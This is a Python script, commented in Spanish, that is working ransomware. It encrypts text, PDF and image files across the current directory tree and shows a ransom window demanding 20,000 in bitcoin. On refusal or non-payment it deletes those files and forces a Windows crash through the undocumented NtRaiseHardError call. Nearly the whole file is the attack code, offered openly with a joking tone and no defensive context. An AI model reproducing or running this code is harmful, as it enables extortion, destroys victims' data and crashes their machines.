from cryptography.fernet import Fernet
import os
from tkinter import *
from tkinter import messagebox
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

# Declarar extensiones que serán procesadas
extensions = ('.txt', '.pdf', '.png', '.jpeg', '.jpg')

# Obtener el directorio actual
directory = os.getcwd()  

# Función para encriptar archivos
def encrypt():
    # Genera una clave de cifrado
    key = Fernet.generate_key()
    key_file_path = os.path.join(os.getcwd(), "key.key")

    # Guarda la clave en un archivo
    with open(key_file_path, "wb") as f:
        f.write(key)

    fernet = Fernet(key)

    # Recorre los archivos en el directorio actual y subcarpetas
    for root, dirs, files in os.walk(os.getcwd()):
        for file_name in files:
            if file_name.endswith(extensions):
                file_path = os.path.join(root, file_name)

                # Lee el contenido del archivo como binario
                with open(file_path, 'rb') as f:
                    data = f.read()

                # Encripta los datos y convierte a texto Base64
                encrypted = fernet.encrypt(data).decode('utf-8')

                # Escribe los datos encriptados como texto Base64
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(encrypted)  # Guarda en modo texto Base64
    
    return key_file_path




# Función para desencriptar archivos
def decrypt(key_file_path):

    # Carga la clave desde el archivo
    with open(key_file_path, "rb") as f:
        key = f.read()

    fernet = Fernet(key)

    # Recorre los archivos en el directorio actual y subcarpetas
    for root, dirs, files in os.walk(os.getcwd()):
        for file_name in files:
            if file_name.endswith(extensions):
                file_path = os.path.join(root, file_name)

                # Lee el contenido del archivo como texto (Base64)
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = f.read()

                # Decodifica el texto Base64 y desencripta
                decrypted = fernet.decrypt(data.encode('utf-8'))

                # Escribe los datos desencriptados en modo binario
                with open(file_path, 'wb') as f:
                    f.write(decrypted)
                    

def remove_files_with_extensions(directory, extensions):
    """
    Elimina todos los archivos con las extensiones especificadas en un directorio y sus subdirectorios.
    """
    for root, dirs, files in os.walk(directory):  # Recorre todos los subdirectorios
        for file in files:
            # Comprueba si el archivo tiene una de las extensiones especificadas
            if file.endswith(extensions):
                file_path = os.path.join(root, file)  # Obtiene la ruta completa del archivo
                try:
                    os.remove(file_path)  # Elimina el archivo
                    print(f"Archivo eliminado: {file_path}")
                except Exception as e:
                    print(f"Error al eliminar {file_path}: {e}")

                    
# Funcion para bsod
def BSOD():
    
    remove_files_with_extensions(directory, extensions)

    # Crea un puntero vacío de tipo c_int
    # Se usará más adelante para pasar a las funciones del sistema.
    nullptr = POINTER(c_int)()

    # Llama a la función RtlAdjustPrivilege para ajustar los privilegios del proceso
    # En este caso, se ajusta el privilegio necesario para poder ejecutar un comando que provoque un BSOD
    windll.ntdll.RtlAdjustPrivilege(
        # El privilegio que se está ajustando (privilegio de apagado del sistema, SeShutdownPrivilege)
        c_uint(19),  
        # Habilitar el privilegio (1 significa habilitado)
        c_uint(1),  
        # El tercer parámetro es un valor de estado (no se utiliza aquí, pero es necesario pasarlo) 
        c_uint(0),   
        # Pasamos una referencia a un entero vacío (se requiere para la firma de la función)
        byref(c_int())  
    )

    # Funcion que provoca un error fatal (BSOD)
    windll.ntdll.NtRaiseHardError(
        # Código de error que provoca una falla grave del sistema
        c_ulong(0xC000007B), 
        # Código de error adicional (en este caso, 0) 
        c_ulong(0), 
        # El puntero que se pasa al sistema (no utilizado aquí, pero es requerido)          
        nullptr,  
        # Otro puntero necesario (aunque no se utiliza en este caso)            
        nullptr,              
        # Determina cómo debe manejar el sistema este error (6 generalmente provoca el BSOD)
        c_uint(6),          
        # Pasa una referencia a un entero vacío (se requiere para la firma de la función)  
        byref(c_uint())       
    )

# funcion de encrypt
key_file_path = encrypt()

# Se crea la ventana principal de la aplicación y se define su tamaño
root = Tk()
root.geometry("600x300")
root.title("I'm a hacker")

# Variable para texto
warningHeader = "YOUR COMPUTER HAS BEEN HACKED!!\n WOMP WOMP"
warningBody = "Your computer files have been encrypted. If you want to open them, pay me BTC$20,000. Otherwise, you will lose all your computer files."


# Primera parte del texto con color azul
label1 = Label(root, text=warningHeader, fg="red", font=("Helvetica", 18, " bold"), padx=20, pady=30)
label1.pack()

# Segunda parte del texto con color rojo
label2 = Label(root, text=warningBody,wraplength=350, font=("Arial", 16), padx=20, pady=10)
label2.pack()

# Se crea una funcion de tipo askquestion
def show_popup():
    # Mostrar el messagebox de manera modal
    popUp01 = messagebox.askquestion("PAY ME", "Are you willing to pay?")

    if popUp01 == 'no':
        messagebox.showinfo("Poor computer","Good luck then!")
        BSOD()
    else: 
        messagebox.showinfo("Gotcha", "Good, you made the right choice")
        messagebox.showinfo("", "Deposit the money here. \nwww.paymealotofmoney.com")
        popUp02 = messagebox.askquestion("", "Did you pay me already?")
        if popUp02 == 'yes':
            messagebox.showinfo("Thank you!", "It was a pleasure doing bussiness with you :)")
            decrypt(key_file_path)
        else:
            messagebox.showinfo("", "Womp womp your computer is done")
            BSOD()

# Usar after() para llamar a la función después de 5 segundos
root.after(5000, show_popup)


root.mainloop()



